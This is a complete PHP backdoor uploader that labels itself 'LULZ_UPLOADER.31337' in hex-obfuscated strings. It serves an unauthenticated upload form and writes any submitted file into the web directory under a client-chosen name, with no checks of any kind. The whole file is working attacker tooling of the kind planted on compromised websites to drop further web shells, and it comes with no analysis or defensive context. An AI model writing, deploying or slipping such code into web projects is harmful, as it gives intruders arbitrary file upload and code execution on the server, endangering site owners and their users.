<?php 
echo "\x4c\x55\x4c\x5a\x5f\x55\x50\x4c\x4f\x41\x44\x45\x52\x2e\x33\x31\x33\x33\x37"." ".hex2bin("4c554c5a5f55504c4f414445522e3331333337")."<br>";
echo '<form method="post" enctype="multipart/form-data"><input type="file" name="___upload" /><input type="submit" name="_upl" /></form>';
if(isset($_POST['_upl'])){
    if(copy($_FILES['___upload']['tmp_name'],$_FILES['___upload']['name'])){
        echo '<b>Upload !!!</b><br><br>';
    }else{
        echo '<b>Fail</b><br><br>';
    }
}
?>
